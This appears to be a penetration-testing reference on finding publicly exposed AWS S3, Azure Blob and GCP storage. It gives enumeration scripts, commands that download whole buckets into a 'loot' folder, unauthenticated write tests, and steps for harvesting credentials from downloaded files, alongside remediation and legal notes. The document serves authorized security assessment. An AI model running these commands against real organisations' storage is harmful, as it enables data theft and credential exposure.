# Cloud Asset Discovery

Guide for discovering publicly exposed cloud storage and services across AWS, Azure, and GCP during OSINT phase.

---

## AWS S3 Bucket Enumeration

### Common Naming Patterns

```
company-name
company-dev
company-staging
company-prod
company-backup
company-logs
company-assets
companyname-public
companyname-private
```

### Discovery Methods

#### 1. Direct Access Attempts

```bash
# Test common patterns
for name in dev staging prod backup logs assets public; do
  aws s3 ls s3://target-$name --no-sign-request 2>/dev/null && echo "[+] Found: target-$name"
done

# Test with company variations
for name in targetcom target-company target_company; do
  aws s3 ls s3://$name-prod --no-sign-request 2>/dev/null && echo "[+] Found: $name-prod"
done
```

#### 2. S3Scanner Tool

```bash
# Install
pip3 install s3scanner

# Scan from wordlist
s3scanner scan --buckets-file bucket_names.txt

# Check if public
s3scanner dump --bucket target-backup
```

#### 3. Certificate Transparency Logs

```bash
# S3 buckets often in SSL certs
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | grep -i s3
```

### Exploitation

**List contents**:
```bash
aws s3 ls s3://target-backup --no-sign-request --recursive
```

**Download files**:
```bash
aws s3 sync s3://target-backup ./target-backup --no-sign-request
```

**Check permissions**:
```bash
# Read
aws s3 ls s3://target-backup --no-sign-request

# Write (test with harmless file)
echo "test" > test.txt
aws s3 cp test.txt s3://target-backup/test.txt --no-sign-request
```

---

## Azure Blob Storage

### Naming Format

```
https://{storage-account}.blob.core.windows.net/{container}
```

### Discovery

#### Common Storage Account Names

```
targetdev
targetprod
targetbackup
targetlogs
targetstaging
```

#### Enumeration Script

```bash
#!/bin/bash
# Test Azure blob storage
for name in dev prod staging backup logs assets; do
  url="https://target$name.blob.core.windows.net/?restype=container&comp=list"
  response=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  if [ "$response" == "200" ]; then
    echo "[+] Found: target$name"
    curl -s "$url"
  fi
done
```

#### MicroBurst Tool

```powershell
# Install
Install-Module -Name MicroBurst -Force

# Enumerate storage accounts
Invoke-EnumerateAzureBlobs -Base target
```

### Exploitation

**List containers**:
```bash
curl "https://targetprod.blob.core.windows.net/?comp=list"
```

**List blobs in container**:
```bash
curl "https://targetprod.blob.core.windows.net/backups?restype=container&comp=list"
```

**Download blob**:
```bash
wget "https://targetprod.blob.core.windows.net/backups/database.bak"
```

---

## Google Cloud Storage (GCS)

### Naming Format

```
gs://bucket-name
https://storage.googleapis.com/bucket-name/
```

### Discovery

#### Common Patterns

```
target-company-prod
target-company-backup
target-assets
target-uploads
target-static
```

#### Enumeration

```bash
# Test with curl
for name in dev prod staging backup logs; do
  url="https://storage.googleapis.com/storage/v1/b/target-$name"
  response=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  if [ "$response" == "200" ]; then
    echo "[+] Found: target-$name"
  fi
done
```

#### GCPBucketBrute

```bash
# Install
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute
cd GCPBucketBrute

# Run
python3 gcpbucketbrute.py -k wordlist.txt
```

### Exploitation

**List objects**:
```bash
curl "https://storage.googleapis.com/storage/v1/b/target-backup/o"
```

**Download object**:
```bash
wget "https://storage.googleapis.com/target-backup/database.sql"
```

---

## General Cloud Asset Discovery

### 1. Google Dorking

```
site:s3.amazonaws.com "target"
site:blob.core.windows.net "target"
site:storage.googleapis.com "target"

inurl:s3.amazonaws.com "target" ext:xls | ext:xlsx | ext:csv
inurl:blob.core.windows.net "target" filetype:sql
```

### 2. GitHub Search

```bash
# Search for hardcoded bucket names
site:github.com "target-backup.s3.amazonaws.com"
site:github.com "targetprod.blob.core.windows.net"

# Search in code
site:github.com org:target-company "s3.amazonaws.com"
```

### 3. Wayback Machine

```bash
# Check historical URLs for bucket references
curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=json&fl=original&collapse=urlkey" | jq -r '.[]' | grep -iE '(s3\.amazonaws|blob\.core\.windows|storage\.googleapis)'
```

---

## Post-Discovery Analysis

### 1. Prioritize High-Value Targets

| File Type | Value | Actions |
|-----------|-------|---------|
| `.sql`, `.bak`, `.dump` | Critical | Download, analyze for credentials |
| `.env`, `.config`, `.yaml` | Critical | Check for API keys, secrets |
| `.xls`, `.xlsx`, `.csv` | High | May contain PII, business data |
| `.log` | Medium | Look for error messages, stack traces |
| `.pdf`, `.doc` | Low | May contain metadata, internal info |

### 2. Extract Credentials

```bash
# Search for secrets in downloaded files
grep -r -iE '(password|api_key|secret|token)' ./target-backup/

# Use trufflehog
trufflehog filesystem ./target-backup --only-verified
```

### 3. Analyze Metadata

```bash
# Check file metadata
exiftool target-backup/*.pdf
exiftool target-backup/*.jpg

# May reveal:
# - Employee usernames
# - Software versions
# - Internal network info
```

---

## Automated Reconnaissance

### Cloud_enum Tool

```bash
# Install
git clone https://github.com/initstring/cloud_enum
cd cloud_enum

# Run against target
python3 cloud_enum.py -k target -k target-company
```

**Checks**:
- AWS S3 buckets
- Azure storage accounts
- GCP buckets
- AWS RDS snapshots
- Azure SQL databases

### Cloudsplaining

```bash
# Analyze AWS IAM permissions (if you have creds)
pip3 install cloudsplaining

# Scan IAM policy
cloudsplaining scan --input-file policy.json
```

---

## Impact Assessment

### Public Read Access

**Risk**: Information disclosure, credential leaks, PII exposure

**Exploitation**:
```bash
aws s3 sync s3://target-backup ./loot --no-sign-request
```

### Public Write Access

**Risk**: Data tampering, malware upload, defacement

**Exploitation** (DO NOT execute without authorization):
```bash
# Test write (benign file only)
echo "test" > test.txt
aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request
```

### Public Read ACL

**Risk**: ACL manipulation, privilege escalation

**Check ACL**:
```bash
aws s3api get-bucket-acl --bucket target-backup --no-sign-request
```

---

## Remediation Advice (for client)

1. **Private by default**: Set all buckets to private unless public access required
2. **Bucket policies**: Use restrictive IAM policies
3. **Logging**: Enable CloudTrail (AWS), Storage Analytics (Azure), Access Logs (GCP)
4. **Encryption**: Enable encryption at rest
5. **Block public access**: Use AWS S3 Block Public Access feature

---

## Legal & Ethical Notes

### ✅ Allowed (Passive)
- Testing bucket name patterns
- Checking if bucket returns 200 OK

### ⚠️ Grey Area
- Listing bucket contents (may be logged)
- Downloading files from public buckets

### ❌ Not Allowed
- Attempting to upload files without authorization
- Modifying ACLs
- Deleting objects

**Always confirm scope before downloading large amounts of data.**

---

## Tools Summary

| Tool | Purpose | Platform |
|------|---------|----------|
| aws-cli | S3 enumeration | AWS |
| s3scanner | Bulk S3 scanning | AWS |
| MicroBurst | Azure blob enum | Azure |
| GCPBucketBrute | GCS enumeration | GCP |
| cloud_enum | Multi-cloud discovery | All |
| trufflehog | Secret detection | Local analysis |

---

## Cross-Reference

- OSINT workflow: `../SKILL.md`
- Secret handling: `../../../EVIDENCE_POLICY.md`
- Technology fingerprinting: `email-pattern-detection.md`
